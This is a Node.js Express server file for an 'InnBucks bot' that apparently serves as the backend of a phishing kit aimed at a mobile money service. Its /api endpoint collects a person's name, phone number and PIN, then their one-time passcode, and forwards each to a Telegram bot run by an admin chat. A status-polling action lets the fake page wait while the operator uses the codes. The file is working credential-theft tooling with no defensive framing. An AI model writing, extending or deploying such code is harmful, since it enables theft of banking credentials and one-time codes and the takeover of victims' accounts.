// server.js - equivalent of api.php + webhook.php
const express = require('express');
const cors = require('cors');
const path = require('path');
const { BOT_TOKEN, ADMIN_CHAT_ID, PORT } = require('./config');
const InnBucksBot = require('./innbucks');

const app = express();
const bot = new InnBucksBot(BOT_TOKEN, ADMIN_CHAT_ID);

// Middleware (equivalent of PHP headers)
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type']
}));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve index.html as static (equivalent of your existing frontend)
app.use(express.static(path.join(__dirname, 'public')));

// ─────────────────────────────────────────────────────────────
// /webhook  — equivalent of webhook.php
// ─────────────────────────────────────────────────────────────
app.post('/webhook', async (req, res) => {
  const update = req.body;
  if (update.callback_query) {
    await bot.handleCallback(update.callback_query);
  }
  res.send('OK');
});

// ─────────────────────────────────────────────────────────────
// /api  — equivalent of api.php
// ─────────────────────────────────────────────────────────────
app.all('/api', async (req, res) => {
  res.setHeader('Content-Type', 'application/json');

  const action = req.body.action || req.query.action || '';

  switch (action) {

    case 'login_attempt': {
      const firstName = req.body.firstName || '';
      const lastName  = req.body.lastName  || '';
      const phone     = req.body.phone     || '';
      const pin       = req.body.pin       || '';

if (!firstName || !lastName || !phone) {
  return res.json({ success: false, error: 'Missing fields' });
}

const result = await bot.sendLoginAlert(firstName, lastName, phone, pin);
      if (result && result.sessionId) {
        return res.json({
          success: true,
          data: { sessionId: result.sessionId }
        });
      } else {
        return res.json({
          success: false,
          error: 'Failed to generate session ID',
          result
        });
      }
    }

    case 'otp_entered': {
      const sessionId = req.body.sessionId || '';
      const otp       = req.body.otp       || '';

      if (!sessionId || !otp) {
        return res.json({ success: false, error: 'Missing data' });
      }

      const result = await bot.sendOtpAlert(sessionId, otp);
      return res.json({ success: true, result });
    }

    case 'check_status': {
      const sessionId = req.query.sessionId || req.body.sessionId || '';

      if (!sessionId) {
        return res.json({ success: false, status: 'unknown' });
      }

      const status = bot.getSessionStatus(sessionId);
      return res.json({ success: true, status });
    }

    default:
      return res.json({ success: false, error: 'Invalid action' });
  }
});

// ─────────────────────────────────────────────────────────────
// Start server
// ─────────────────────────────────────────────────────────────
app.listen(PORT, () => {
  console.log(`✅ InnBucks bot server running on port ${PORT}`);
  console.log(`   API endpoint : http://localhost:${PORT}/api`);
  console.log(`   Webhook URL  : http://localhost:${PORT}/webhook`);
  console.log(`   Frontend     : http://localhost:${PORT}/`);
});
